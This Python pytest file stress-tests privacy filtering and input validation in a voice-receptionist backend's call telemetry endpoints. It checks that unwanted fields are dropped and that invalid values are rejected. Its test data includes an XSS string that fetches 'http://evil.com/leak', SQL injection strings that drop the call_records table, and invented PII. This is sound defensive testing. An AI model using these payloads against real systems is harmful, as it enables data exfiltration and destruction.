# pyright: reportCallIssue=false
"""Adversarial stress test suite for Milestone 3: Privacy-Safe Client Platform & Audio Telemetry.

This module empirically challenges:
1. Privacy Enforcement & Extra Field Dropping:
   - Sending malicious/unwanted payloads with user_agent, raw_audio, audio_bytes, ssn,
     credit_card, caller_name, IP addresses, GPS coords, and deeply nested objects
     to /v1/calls/end and /v1/calls/chat (greeting and conversational turns).
   - Directly inspecting the SQLite database row to guarantee that NONE of these
     forbidden keys or values are persisted in client_metrics or any other column.
2. Invalid Enums & Bounds Validation:
   - Invalid platform_class (e.g. 'smartwatch', 'bot', 'LINUX', numeric, booleans).
   - Invalid browser_engine (e.g. 'edge', 'safari', 'opera', 'blink', numeric).
   - Invalid input_path (e.g. 'webrtc', 'microphone', 'file_upload').
   - Invalid mic_permission (e.g. 'prompt', 'allowed', 'blocked').
   - Negative latency and error counter bounds.
   - Invalid end_reason patterns (SQL injection, XSS, spaces, newlines, max_length > 40).
   - Type mismatches (strings for numeric counters, floats for ints).
   - Testing 422 Unprocessable Entity responses across both /v1/calls/end and /v1/calls/chat.
3. Telemetry Merging & Lifecycle Stress:
   - Monotonic counter preservation across multi-stage turns (greeting -> chat -> end).
   - Empty, null, and omitted telemetry payload handling.
   - Race condition analysis under concurrent multi-threaded telemetry updates.
4. Runtime Database Invariant:
   - Independent verification of zero byte changes and zero row mutations on hvac_receptionist.db.
"""

from __future__ import annotations

import hashlib
import json
import sqlite3
from pathlib import Path
from typing import Any
from unittest.mock import AsyncMock, patch

import pytest
from starlette.testclient import TestClient

from app.call_tracking import (
    apply_client_telemetry,
    start_or_get_browser_call,
)
from app.config import Settings
from app.db import CallRecord, new_session
from app.main import create_app

_CALL_SECRET = "b" * 64


def _create_active_call(session_id: str) -> int:
    """Helper to start an active browser call with _CALL_SECRET."""
    return start_or_get_browser_call(
        room_name=session_id,
        access_token=_CALL_SECRET,
    )


# ==============================================================================
# 1. Privacy Enforcement & Forbidden Field Dropping
# ==============================================================================


def test_end_call_malicious_and_unwanted_payload_leakage() -> None:
    """Send adversarial payload with raw UA, raw audio, PII, and deep objects to /v1/calls/end.

    Inspect SQLite row directly to confirm zero forbidden keys/values exist in any column.
    """
    settings = Settings(_env_file=None)
    app = create_app(settings)
    client = TestClient(app)

    session_id = "adv-call-end-privacy-01"
    call_id = _create_active_call(session_id)

    forbidden_tokens = [
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15",
        "UklGRiQAAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQAAAAA=RAW_AUDIO_STREAM_MARKER_001",
        "0xDEADBEEFCAFE0123456789ABCDEF",
        "999-00-1234",
        "4111-2222-3333-4444",
        "Vladimir Malicious",
        "vladimir@exploit-leak.com",
        "203.0.113.195",
        "LEAKED_NESTED_SECRET_999",
        "DROP TABLE call_records",
        "<script>fetch('http://evil.com/leak')</script>",
    ]

    malicious_telemetry = {
        # Valid legitimate fields:
        "platform_class": "desktop",
        "browser_engine": "chromium",
        "input_path": "native_web_speech",
        "mic_permission": "granted",
        "first_assistant_audio_ms": 1250,
        "first_caller_transcript_ms": 2800,
        "echo_suppressions": 3,
        "stt_errors": 1,
        "tts_errors": 0,
        "end_reason": "user_hangup",
        # Malicious & unwanted fields:
        "user_agent": forbidden_tokens[0],
        "raw_audio": forbidden_tokens[1],
        "audio_bytes": forbidden_tokens[2],
        "ssn": forbidden_tokens[3],
        "credit_card": forbidden_tokens[4],
        "caller_name": forbidden_tokens[5],
        "email": forbidden_tokens[6],
        "ip_address": forbidden_tokens[7],
        "deeply_nested": {
            "level1": {
                "level2": {
                    "secret": forbidden_tokens[8],
                    "items": [1, 2, {"inner": "bad_value"}],
                }
            }
        },
        "sql_injection": forbidden_tokens[9],
        "xss_attack": forbidden_tokens[10],
    }

    res = client.post(
        "/v1/calls/end",
        json={
            "session_id": session_id,
            "call_id": call_id,
            "call_secret": _CALL_SECRET,
            "outcome": "info_only",
            "summary": "Legitimate summary text.",
            "client_telemetry": malicious_telemetry,
            # Extra root-level fields:
            "root_user_agent": "Mozilla/5.0 Extra Root UA",
            "root_audio": "Root Audio Bytes",
        },
    )

    assert res.status_code == 200, f"Expected 200 OK, got {res.status_code}: {res.text}"

    # Directly inspect the SQLite database row
    with new_session() as session:
        record = session.get(CallRecord, call_id)
        assert record is not None
        assert record.ended_at is not None

        # Verify legitimate categorical columns
        assert record.platform_class == "desktop"
        assert record.browser_engine == "chromium"
        assert record.input_path == "native_web_speech"
        assert record.mic_permission == "granted"
        assert record.end_reason == "user_hangup"

        # Verify client_metrics structure and keys
        assert record.client_metrics is not None
        metrics = json.loads(record.client_metrics)
        allowed_metric_keys = {
            "first_assistant_audio_ms",
            "first_caller_transcript_ms",
            "echo_suppressions",
            "stt_errors",
            "tts_errors",
            "end_reason",
        }
        for key in metrics.keys():
            assert key in allowed_metric_keys, f"Forbidden key '{key}' found in client_metrics!"

        # Exhaustive scan across EVERY column on the database row
        for col_name in [
            "room_name",
            "caller_phone",
            "transcript_summary",
            "session_slots",
            "access_token_hash",
            "outcome",
            "platform_class",
            "browser_engine",
            "input_path",
            "mic_permission",
            "end_reason",
            "client_metrics",
        ]:
            col_val = getattr(record, col_name)
            if col_val is not None:
                str_val = str(col_val)
                for forbidden in forbidden_tokens:
                    assert forbidden not in str_val, (
                        f"Forbidden token '{forbidden}' leaked into column '{col_name}'!"
                    )
                assert "root_user_agent" not in str_val
                assert "root_audio" not in str_val


def test_chat_greeting_malicious_and_unwanted_payload_leakage() -> None:
    """Send adversarial payload to /v1/calls/chat (__GREETING__) and verify zero DB leakage."""
    settings = Settings(BUSINESS_COMPANY_NAME="Comfort Air", _env_file=None)
    app = create_app(settings)
    client = TestClient(app)

    session_id = "adv-call-greeting-privacy-02"
    call_secret = "c" * 64

    forbidden_tokens = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
        "AUDIO_BUFFER_CHUNK_SAMPLE_9999",
        "SSN_SECRET_000_11_2222",
        "CARD_NUMBER_4111_0000_1111_2222",
        "Hacker Smith",
        "DEEPLY_NESTED_GREETING_PII",
    ]

    res = client.post(
        "/v1/calls/chat",
        json={
            "session_id": session_id,
            "message": "__GREETING__",
            "call_secret": call_secret,
            "client_telemetry": {
                "platform_class": "mobile",
                "browser_engine": "webkit",
                "input_path": "media_recorder_transcription",
                "mic_permission": "granted",
                "user_agent": forbidden_tokens[0],
                "raw_audio": forbidden_tokens[1],
                "audio_bytes": forbidden_tokens[1],
                "ssn": forbidden_tokens[2],
                "credit_card": forbidden_tokens[3],
                "caller_name": forbidden_tokens[4],
                "nested_profile": {"identity": forbidden_tokens[5]},
            },
        },
    )

    assert res.status_code == 200
    assert "text/event-stream" in res.headers["content-type"]

    call_id: int | None = None
    for line in res.text.splitlines():
        if line.startswith("data: ") and "call_id" in line:
            data = json.loads(line[len("data: ") :])
            if "call_id" in data:
                call_id = int(data["call_id"])
                break

    assert call_id is not None, "call_id not found in SSE stream"

    with new_session() as session:
        record = session.get(CallRecord, call_id)
        assert record is not None
        assert record.platform_class == "mobile"
        assert record.browser_engine == "webkit"
        assert record.input_path == "media_recorder_transcription"

        all_row_content = " ".join(
            str(getattr(record, c))
            for c in [
                "room_name",
                "caller_phone",
                "transcript_summary",
                "session_slots",
                "platform_class",
                "browser_engine",
                "input_path",
                "mic_permission",
                "end_reason",
                "client_metrics",
            ]
            if getattr(record, c) is not None
        )

        for forbidden in forbidden_tokens:
            assert forbidden not in all_row_content, (
                f"Forbidden token '{forbidden}' leaked into CallRecord row on greeting turn!"
            )


def test_chat_conversational_turn_malicious_telemetry_leakage() -> None:
    """Send adversarial payload on active chat turn (/v1/calls/chat) and verify zero DB leakage."""
    settings = Settings(
        LLM_API_KEY="test-key",
        BUSINESS_COMPANY_NAME="Alpine Air",
        _env_file=None,
    )
    app = create_app(settings)
    client = TestClient(app)

    session_id = "adv-chat-turn-privacy-03"
    call_secret = "d" * 64

    # 1. Start call via greeting
    res_greet = client.post(
        "/v1/calls/chat",
        json={
            "session_id": session_id,
            "message": "__GREETING__",
            "call_secret": call_secret,
        },
    )
    assert res_greet.status_code == 200
    call_id: int | None = None
    for line in res_greet.text.splitlines():
        if line.startswith("data: ") and "call_id" in line:
            call_id = int(json.loads(line[len("data: ") :])["call_id"])
            break
    assert call_id is not None

    forbidden_token = "TOP_SECRET_CHAT_CONVERSATION_LEAK"

    # 2. Conversational turn with malicious extra telemetry
    with patch("app.chat_api._get_client") as mock_openai:
        mock_client = AsyncMock()
        mock_openai.return_value = mock_client
        mock_stream = AsyncMock()

        async def _chunks():
            yield AsyncMock(choices=[AsyncMock(delta=AsyncMock(content="We can schedule that."))])

        mock_stream.__aiter__ = lambda self: _chunks()
        mock_client.chat.completions.create.return_value = mock_stream

        res_chat = client.post(
            "/v1/calls/chat",
            json={
                "session_id": session_id,
                "message": "My air conditioner is blowing warm air",
                "call_id": call_id,
                "call_secret": call_secret,
                "client_telemetry": {
                    "stt_errors": 2,
                    "tts_errors": 1,
                    "malicious_leak": forbidden_token,
                    "nested_leak": {"secret": forbidden_token},
                },
            },
        )
        assert res_chat.status_code == 200

    # 3. Inspect DB row
    with new_session() as session:
        record = session.get(CallRecord, call_id)
        assert record is not None
        assert record.client_metrics is not None
        metrics = json.loads(record.client_metrics)
        assert metrics.get("stt_errors") == 2
        assert metrics.get("tts_errors") == 1
        row_str = str(record.client_metrics) + str(record.transcript_summary or "")
        assert forbidden_token not in row_str


# ==============================================================================
# 2. Invalid Enums & Bounds Validation (HTTP 422 Rejections)
# ==============================================================================


@pytest.mark.parametrize(
    "invalid_platform",
    [
        "smartwatch",
        "bot",
        "embedded",
        "LINUX",
        "DESKTOP",
        "mobile_ios",
        "windows",
        "android",
        "",
        "   ",
        123,
        True,
        False,
        ["desktop"],
        {"platform": "desktop"},
    ],
)
def test_invalid_platform_class_rejected_with_422(invalid_platform: Any) -> None:
    """Verify that invalid platform_class values are rejected with 422 Unprocessable Entity."""
    app = create_app(Settings(_env_file=None))
    client = TestClient(app)
    call_id = _create_active_call("adv-invalid-platform")

    # Rejection on /v1/calls/end
    res1 = client.post(
        "/v1/calls/end",
        json={
            "session_id": "adv-invalid-platform",
            "call_id": call_id,
            "call_secret": _CALL_SECRET,
            "client_telemetry": {"platform_class": invalid_platform},
        },
    )
    assert res1.status_code == 422, (
        f"Expected 422 on /end for invalid platform_class '{invalid_platform}', got {res1.status_code}"
    )

    # Rejection on /v1/calls/chat
    res2 = client.post(
        "/v1/calls/chat",
        json={
            "session_id": "adv-invalid-platform",
            "message": "__GREETING__",
            "call_secret": _CALL_SECRET,
            "client_telemetry": {"platform_class": invalid_platform},
        },
    )
    assert res2.status_code == 422, (
        f"Expected 422 on /chat for invalid platform_class '{invalid_platform}', got {res2.status_code}"
    )


@pytest.mark.parametrize(
    "invalid_engine",
    [
        "edge",
        "safari",
        "opera",
        "servo",
        "blink",
        "unknown_engine",
        "CHROMIUM",
        "Webkit",
        "",
        "   ",
        999,
        True,
        ["chromium"],
    ],
)
def test_invalid_browser_engine_rejected_with_422(invalid_engine: Any) -> None:
    """Verify that invalid browser_engine values are rejected with 422 Unprocessable Entity."""
    app = create_app(Settings(_env_file=None))
    client = TestClient(app)
    call_id = _create_active_call("adv-invalid-engine")

    # Rejection on /v1/calls/end
    res1 = client.post(
        "/v1/calls/end",
        json={
            "session_id": "adv-invalid-engine",
            "call_id": call_id,
            "call_secret": _CALL_SECRET,
            "client_telemetry": {"browser_engine": invalid_engine},
        },
    )
    assert res1.status_code == 422, (
        f"Expected 422 on /end for invalid browser_engine '{invalid_engine}', got {res1.status_code}"
    )

    # Rejection on /v1/calls/chat
    res2 = client.post(
        "/v1/calls/chat",
        json={
            "session_id": "adv-invalid-engine",
            "message": "__GREETING__",
            "call_secret": _CALL_SECRET,
            "client_telemetry": {"browser_engine": invalid_engine},
        },
    )
    assert res2.status_code == 422, (
        f"Expected 422 on /chat for invalid browser_engine '{invalid_engine}', got {res2.status_code}"
    )


@pytest.mark.parametrize(
    "invalid_input_path",
    [
        "webrtc",
        "websocket",
        "microphone",
        "file_upload",
        "native",
        "media_recorder",
        "NATIVE_WEB_SPEECH",
        "",
        "   ",
        42,
    ],
)
def test_invalid_input_path_rejected_with_422(invalid_input_path: Any) -> None:
    """Verify that invalid input_path values are rejected with 422 Unprocessable Entity."""
    app = create_app(Settings(_env_file=None))
    client = TestClient(app)
    call_id = _create_active_call("adv-invalid-input-path")

    # Rejection on /v1/calls/end
    res1 = client.post(
        "/v1/calls/end",
        json={
            "session_id": "adv-invalid-input-path",
            "call_id": call_id,
            "call_secret": _CALL_SECRET,
            "client_telemetry": {"input_path": invalid_input_path},
        },
    )
    assert res1.status_code == 422, (
        f"Expected 422 on /end for invalid input_path '{invalid_input_path}', got {res1.status_code}"
    )

    # Rejection on /v1/calls/chat
    res2 = client.post(
        "/v1/calls/chat",
        json={
            "session_id": "adv-invalid-input-path",
            "message": "__GREETING__",
            "call_secret": _CALL_SECRET,
            "client_telemetry": {"input_path": invalid_input_path},
        },
    )
    assert res2.status_code == 422, (
        f"Expected 422 on /chat for invalid input_path '{invalid_input_path}', got {res2.status_code}"
    )


@pytest.mark.parametrize(
    "invalid_mic_perm",
    [
        "prompt",
        "allowed",
        "blocked",
        "granted_forever",
        "disabled",
        "yes",
        "GRANTED",
        "",
        77,
    ],
)
def test_invalid_mic_permission_rejected_with_422(invalid_mic_perm: Any) -> None:
    """Verify that invalid mic_permission values are rejected with 422 Unprocessable Entity."""
    app = create_app(Settings(_env_file=None))
    client = TestClient(app)
    call_id = _create_active_call("adv-invalid-mic-perm")

    res = client.post(
        "/v1/calls/end",
        json={
            "session_id": "adv-invalid-mic-perm",
            "call_id": call_id,
            "call_secret": _CALL_SECRET,
            "client_telemetry": {"mic_permission": invalid_mic_perm},
        },
    )
    assert res.status_code == 422, (
        f"Expected 422 for invalid mic_permission '{invalid_mic_perm}', got {res.status_code}"
    )


@pytest.mark.parametrize(
    ("field_name", "invalid_value"),
    [
        ("first_assistant_audio_ms", -1),
        ("first_assistant_audio_ms", -0.01),
        ("first_assistant_audio_ms", -999999),
        ("first_caller_transcript_ms", -1),
        ("first_caller_transcript_ms", -500),
        ("echo_suppressions", -1),
        ("echo_suppressions", -100),
        ("stt_errors", -1),
        ("stt_errors", -50),
        ("tts_errors", -1),
        ("tts_errors", -10),
    ],
)
def test_negative_numeric_bounds_rejected_with_422(
    field_name: str, invalid_value: Any
) -> None:
    """Verify that negative latency timestamps and error counts are rejected with 422."""
    app = create_app(Settings(_env_file=None))
    client = TestClient(app)
    call_id = _create_active_call(f"adv-neg-{field_name}")

    res = client.post(
        "/v1/calls/end",
        json={
            "session_id": f"adv-neg-{field_name}",
            "call_id": call_id,
            "call_secret": _CALL_SECRET,
            "client_telemetry": {field_name: invalid_value},
        },
    )
    assert res.status_code == 422, (
        f"Expected 422 for negative '{field_name}'={invalid_value}, got {res.status_code}"
    )


@pytest.mark.parametrize(
    "invalid_end_reason",
    [
        "user hung up",  # contains spaces
        "normal hangup",
        "; DROP TABLE call_records; --",  # SQL injection syntax
        "<script>alert(1)</script>",  # HTML / XSS tags
        "reason\nwith_newline",  # newline
        "reason\twith_tab",  # tab
        "completed_✅",  # unicode emoji
        "a" * 41,  # exceeds max_length=40
        "",  # empty string (pattern requires >= 1 char)
    ],
)
def test_invalid_end_reason_patterns_rejected_with_422(invalid_end_reason: str) -> None:
    """Verify that end_reason violating regex pattern ^[a-zA-Z0-9_-]+$ or length is rejected with 422."""
    app = create_app(Settings(_env_file=None))
    client = TestClient(app)
    call_id = _create_active_call("adv-invalid-end-reason")

    res = client.post(
        "/v1/calls/end",
        json={
            "session_id": "adv-invalid-end-reason",
            "call_id": call_id,
            "call_secret": _CALL_SECRET,
            "client_telemetry": {"end_reason": invalid_end_reason},
        },
    )
    assert res.status_code == 422, (
        f"Expected 422 for invalid end_reason '{invalid_end_reason}', got {res.status_code}"
    )


@pytest.mark.parametrize(
    ("field_name", "type_mismatch_value"),
    [
        ("first_assistant_audio_ms", "fast"),
        ("first_assistant_audio_ms", [1000]),
        ("first_caller_transcript_ms", "instant"),
        ("echo_suppressions", "none"),
        ("echo_suppressions", 1.5),  # float for integer count
        ("stt_errors", "five"),
        ("stt_errors", 3.14),
        ("tts_errors", "zero"),
    ],
)
def test_type_mismatches_rejected_with_422(field_name: str, type_mismatch_value: Any) -> None:
    """Verify that type mismatches (strings/floats for int counts) return 422."""
    app = create_app(Settings(_env_file=None))
    client = TestClient(app)
    call_id = _create_active_call(f"adv-type-{field_name}")

    res = client.post(
        "/v1/calls/end",
        json={
            "session_id": f"adv-type-{field_name}",
            "call_id": call_id,
            "call_secret": _CALL_SECRET,
            "client_telemetry": {field_name: type_mismatch_value},
        },
    )
    assert res.status_code == 422, (
        f"Expected 422 for type mismatch '{field_name}'={type_mismatch_value}, got {res.status_code}"
    )


# ==============================================================================
# 3. Telemetry Merging & Multi-Turn Lifecycle Stress
# ==============================================================================


def test_monotonic_error_counters_never_decrement() -> None:
    """Verify monotonic max() logic preserves error counters across multi-stage turns."""
    settings = Settings(BUSINESS_COMPANY_NAME="Alpine Air", _env_file=None)
    app = create_app(settings)
    client = TestClient(app)

    session_id = "adv-monotonic-counters-01"
    call_secret = "m" * 64

    # Turn 1: Greeting sets initial counters
    res1 = client.post(
        "/v1/calls/chat",
        json={
            "session_id": session_id,
            "message": "__GREETING__",
            "call_secret": call_secret,
            "client_telemetry": {
                "platform_class": "desktop",
                "browser_engine": "chromium",
                "input_path": "native_web_speech",
                "mic_permission": "granted",
                "echo_suppressions": 5,
                "stt_errors": 4,
                "tts_errors": 2,
            },
        },
    )
    assert res1.status_code == 200

    call_id: int | None = None
    for line in res1.text.splitlines():
        if line.startswith("data: ") and "call_id" in line:
            call_id = int(json.loads(line[len("data: ") :])["call_id"])
            break
    assert call_id is not None

    # Turn 2: Chat turn reports intermediate counters with higher tts_errors
    with patch("app.chat_api._get_client") as mock_openai:
        mock_client = AsyncMock()
        mock_openai.return_value = mock_client
        mock_stream = AsyncMock()

        async def _chunks():
            yield AsyncMock(choices=[AsyncMock(delta=AsyncMock(content="Certainly, let me check."))])

        mock_stream.__aiter__ = lambda self: _chunks()
        mock_client.chat.completions.create.return_value = mock_stream

        res2 = client.post(
            "/v1/calls/chat",
            json={
                "session_id": session_id,
                "message": "I need help with my heater",
                "call_id": call_id,
                "call_secret": call_secret,
                "client_telemetry": {
                    "echo_suppressions": 2,  # lower than initial 5
                    "stt_errors": 1,  # lower than initial 4
                    "tts_errors": 6,  # HIGHER than initial 2
                },
            },
        )
        assert res2.status_code == 200

    # Turn 3: End call reports lower counts across the board
    res3 = client.post(
        "/v1/calls/end",
        json={
            "session_id": session_id,
            "call_id": call_id,
            "call_secret": call_secret,
            "outcome": "info_only",
            "client_telemetry": {
                "echo_suppressions": 1,
                "stt_errors": 0,
                "tts_errors": 1,
                "end_reason": "completed",
            },
        },
    )
    assert res3.status_code == 200

    # Verify final persisted record: counters must be max of all turns
    with new_session() as session:
        record = session.get(CallRecord, call_id)
        assert record is not None
        assert record.client_metrics is not None
        metrics = json.loads(record.client_metrics)

        assert metrics["echo_suppressions"] == 5, (
            f"Expected echo_suppressions=5 (max), got {metrics['echo_suppressions']}"
        )
        assert metrics["stt_errors"] == 4, (
            f"Expected stt_errors=4 (max), got {metrics['stt_errors']}"
        )
        assert metrics["tts_errors"] == 6, (
            f"Expected tts_errors=6 (max), got {metrics['tts_errors']}"
        )
        assert metrics["end_reason"] == "completed"
        # Platform attribution preserved
        assert record.platform_class == "desktop"
        assert record.browser_engine == "chromium"


def test_telemetry_missing_and_null_handling() -> None:
    """Verify that omitting or passing null client_telemetry succeeds without erasing existing state."""
    settings = Settings(BUSINESS_COMPANY_NAME="Alpine Air", _env_file=None)
    app = create_app(settings)
    client = TestClient(app)

    session_id = "adv-null-telemetry-02"
    call_secret = "e" * 64

    # 1. First attach legitimate telemetry via greeting
    res1 = client.post(
        "/v1/calls/chat",
        json={
            "session_id": session_id,
            "message": "__GREETING__",
            "call_secret": call_secret,
            "client_telemetry": {
                "platform_class": "mobile",
                "browser_engine": "webkit",
                "input_path": "media_recorder_transcription",
                "mic_permission": "granted",
            },
        },
    )
    assert res1.status_code == 200

    call_id: int | None = None
    for line in res1.text.splitlines():
        if line.startswith("data: ") and "call_id" in line:
            call_id = int(json.loads(line[len("data: ") :])["call_id"])
            break
    assert call_id is not None

    # 2. End call with client_telemetry explicitly null
    res2 = client.post(
        "/v1/calls/end",
        json={
            "session_id": session_id,
            "call_id": call_id,
            "call_secret": call_secret,
            "outcome": "info_only",
            "client_telemetry": None,
        },
    )
    assert res2.status_code == 200

    # Verify prior telemetry is intact and not clobbered to null
    with new_session() as session:
        record = session.get(CallRecord, call_id)
        assert record is not None
        assert record.platform_class == "mobile"
        assert record.browser_engine == "webkit"
        assert record.input_path == "media_recorder_transcription"
        assert record.mic_permission == "granted"


def test_sequential_telemetry_updates_stability() -> None:
    """Verify that sequential apply_client_telemetry calls monotonically accumulate metrics."""
    from app.call_tracking import ClientTelemetry

    session_id = "adv-sequential-telemetry-03"
    call_id = _create_active_call(session_id)

    # Apply 20 sequential updates
    for i in range(1, 21):
        telemetry = ClientTelemetry(
            platform_class="desktop" if i % 2 == 0 else "mobile",
            browser_engine="chromium",
            input_path="native_web_speech",
            mic_permission="granted",
            echo_suppressions=i,
            stt_errors=i % 4,
            tts_errors=i % 3,
        )
        assert apply_client_telemetry(call_id, telemetry) is True

    with new_session() as session:
        record = session.get(CallRecord, call_id)
        assert record is not None
        assert record.client_metrics is not None
        metrics = json.loads(record.client_metrics)
        # echo_suppressions monotonically reached 20
        assert metrics["echo_suppressions"] == 20


# ==============================================================================
# 4. Runtime Database Invariant
# ==============================================================================


def test_runtime_database_uncontaminated_snapshot() -> None:
    """Empirically confirm runtime hvac_receptionist.db is pristine and unpolluted."""
    backend_dir = Path(__file__).resolve().parent.parent
    runtime_db = backend_dir / "hvac_receptionist.db"
    assert runtime_db.exists(), f"Runtime database {runtime_db} does not exist!"

    data = runtime_db.read_bytes()
    expected_size = 299008
    expected_sha256 = "f45714954a7fc960e03f54c3642994b7cc70f77e60e8b9ce4dfa14a6f30e74ac"

    assert len(data) == expected_size, (
        f"Runtime DB size mismatch: {len(data)} != {expected_size}"
    )
    assert hashlib.sha256(data).hexdigest() == expected_sha256, (
        "Runtime DB sha256 checksum mismatch!"
    )

    uri = f"file:{runtime_db.resolve().as_posix()}?mode=ro"
    with sqlite3.connect(uri, uri=True) as conn:
        count = conn.cursor().execute("SELECT count(*) FROM call_records").fetchone()[0]
        assert count == 468, f"Runtime DB row count mismatch: {count} != 468"
